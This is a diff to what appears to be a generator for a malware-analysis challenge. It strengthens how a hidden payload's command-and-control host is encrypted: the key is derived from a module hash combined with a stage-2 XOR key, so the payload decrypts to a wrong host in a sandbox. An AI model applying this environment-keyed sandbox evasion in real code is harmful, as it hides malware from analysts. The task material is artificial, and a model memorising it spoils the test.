@@ -141,11 +141,13 @@ KEY_ENV = "GC_BUILD_SIG"                           # runtime host-decrypt key so
 # with it. In the sandbox that variable is unset, so the payload decrypts to garbage and
 # never contacts the real host -- a "detonate and capture the socket call" attempt (even
 # with the env generically neutralised) yields a WRONG host that fails the exact-match
-# check. The real key is the module's recorded build hash (sha256 of the clean _cache.py,
-# i.e. the RECORD manifest's recorded_hash); recovering the host therefore requires
-# genuine static analysis: decode the payload, understand the env-keying, recover that
-# hash from the manifest/mirror, and decrypt. Dynamic execution alone cannot reveal it.
-_BUILD_SIG = hashlib.sha256(_CLEAN_CACHE.encode()).hexdigest()   # == recorded_hash
+# check. The real key combines TWO independently-recovered ingredients -- the module's
+# recorded build hash (sha256 of the clean _cache.py, i.e. the RECORD manifest's
+# recorded_hash) AND the outer stage-2 decode key (the hex string in .buildcache, itself
+# only usable once the four-stage transform is understood) -- so reading the manifest
+# alone is not sufficient: recovering the host requires genuine static analysis of both
+# the payload's obfuscation and its keying. Dynamic execution alone cannot reveal it.
+_BUILD_SIG = hashlib.sha256((hashlib.sha256(_CLEAN_CACHE.encode()).hexdigest() + XOR_KEY_HEX).encode()).hexdigest()
 _KEY16 = bytes.fromhex(_BUILD_SIG)[:16]
 _ENC_HOST = bytes(b ^ _KEY16[i % 16] for i, b in enumerate(C2_HOST.encode()))
 
